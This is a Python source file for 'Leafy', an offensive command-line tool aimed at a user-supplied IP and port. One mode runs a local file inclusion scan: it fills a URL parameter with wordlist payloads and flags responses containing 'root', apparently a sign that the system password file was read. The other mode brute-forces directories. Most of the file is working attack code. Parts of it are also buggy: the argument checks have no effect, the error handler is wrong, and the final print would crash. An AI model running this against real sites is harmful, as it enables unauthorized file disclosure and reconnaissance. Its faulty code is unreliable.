import argparse
from ast import arg
import urllib.request
from urllib.error import HTTPError
import pyfiglet

# Initial Banner
init_banner = pyfiglet.figlet_format("Leafy")
print(init_banner)

count = 0

# Dir busting function
def getRespCode(url):
    try:
        resp = urllib.request.urlopen(url)
        # print(resp.getcode())
        if resp.getcode() == 200 or resp.getcode() == 204 or resp.getcode() == 301 or resp.getcode() == 302 or resp.getcode() == 307 or resp.getcode() == 401 or resp.getcode() == 403:
            print(url)
    except HTTPError as e:
        return e.code()

# Init parser
parser = argparse.ArgumentParser()

# Add Args
parser.add_argument("-m", "--mode", help="What mode to run leafy on", metavar="MODE", dest="mode", type=str, required=True) # Required
parser.add_argument("-i", "--ip", help="The IP address of the website you are targeting", metavar="IP", dest="ip", type=str) # LFI, DIR
parser.add_argument("-p", "--port", help="The port the website is running on", metavar="PORT", dest="port", type=str) # LFI, DIR
parser.add_argument("-a", "--path", help="Full path", metavar="PATH", dest="path", type=str) # LFI, DIR
parser.add_argument("-e", "--extension", help="extension to brute force", metavar="TYPE", dest="ext", type=str) # DIR
parser.add_argument("-P", "--parameter", help="The parameter to use", metavar="PARAM", dest="param", type=str) # LFI
parser.add_argument("-P2", "--parameter2", help="In case you need a second parameter after lfi line", metavar="PARAM2", dest="param2", type=str)
parser.add_argument("-l", "--list", help="The full path to the wordlist", metavar="LIST", dest="list", type=str) # LFI, DIR

# Get the args
args = parser.parse_args()

# -----------------------------------------------------------------------------------------------------------

# LFI MODE
if args.mode == "lfi":
    
    # Test for all required arguments
    # Test for IP
    try:
        args.ip
    except:
        print('You need to indicate an IP to target')
        exit
    
    # Test for port
    try:
        args.port
    except:
        print("you need to indicate a port to target")
        exit

    # Test for path
    try:
        args.path
    except:
        print("you need to indicate a path to target")
        exit

    # Test for param
    try:
        args.param
    except:
        print("you need to indicate a parameter to target")
        exit
    
    # Test for param
    try:
        args.param2
    except:
        print("you need to indicate a parameter to target")
        exit
    
    # Test for list
    try:
        args.list
    except:
        print("you need to indicate a list")
        exit

    # Define the website
    website = "http://" + args.ip + ":" + args.port + "/" + args.path + args.param

    # Open list and read all the lines
    file = open(args.list, 'r')
    lines = file.readlines()
    with open(args.list, 'r') as fp:
        length = len(fp.readlines())

    # Banner
    banner = pyfiglet.figlet_format("LFI - CHECK")
    print(banner)
    print("Website: " + website + "..." + args.param2)
    print("Wordlist: " + args.list)
    print("Lines: " + str(length) + "\n")

    # Read and loop through every line in file
    for line in lines:
        payload = website + line + args.param2
        payload = payload.replace("\n", "")
        print(payload)
        resp = urllib.request.urlopen(payload)
        if b'root' in resp.read():
            print(payload, end="")
            count += 1
        else:
            continue

# -----------------------------------------------------------------------------------------------------------

# DIR BUST MODE
if args.mode == "dir":
    
    # Test for required args
    # Test for IP
    try:
        args.ip
    except:
        print('You need to indicate an IP to target')
        exit
    
    # Test for port
    try:
        args.port
    except:
        print("you need to indicate a port to target")
        exit

    # Test for path
    try:
        args.path
    except:
        print("you need to indicate a path to target")
        exit
    
    # Test for extension
    try:
        args.ext
    except:
        print("you need to indicate an extension")
        exit

    # Test for list
    try:
        args.list
    except:
        print("you need to indicate a list")
        exit
    

    # Define the website
    website = "http://" + args.ip + ":" + args.port + "/" + args.path + "/"

    # Open list and read all the lines
    file = open(args.list, 'r')
    lines = file.readlines()
    with open(args.list, 'r') as fp:
        length = len(fp.readlines())

    # Banner
    banner = pyfiglet.figlet_format("DIR BUSTER")
    print(banner)
    print("Website: " + website)
    print("Wordlist: " + args.list)
    print("Lines: " + str(length) + "\n")

    # Directory busting
    for line in lines:
        payload = website + line + str(args.ext)
        try:
            getRespCode(payload)
        except:
            continue

# -----------------------------------------------------------------------------------------------------------

# Print when script is done
print(count + "Potential paths found")
print("done")
